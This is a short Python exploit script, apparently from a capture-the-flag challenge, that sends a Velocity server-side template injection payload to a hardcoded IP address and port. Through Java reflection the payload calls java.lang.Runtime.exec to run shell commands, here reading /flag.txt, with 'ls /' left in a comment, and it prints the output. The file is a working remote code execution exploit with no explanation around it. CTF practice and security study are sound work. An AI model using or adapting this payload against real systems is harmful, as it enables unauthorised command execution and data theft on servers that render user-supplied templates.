import requests

ADDRESS = "83.136.254.158:34439"
URL = f"http://{ADDRESS}"
CMD = "ls"

#set($ex=$rt.getRuntime().exec('ls /'))
PAYLOAD = """
#set($x='')
#set($rt=$x.class.forName('java.lang.Runtime'))
#set($chr=$x.class.forName('java.lang.Character'))
#set($str=$x.class.forName('java.lang.String'))
#set($ex=$rt.getRuntime().exec('cat /flag.txt'))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
"""

if __name__ == "__main__":
    r = requests.post(url=URL, data={"text": f"{PAYLOAD}"})
    print(r.text)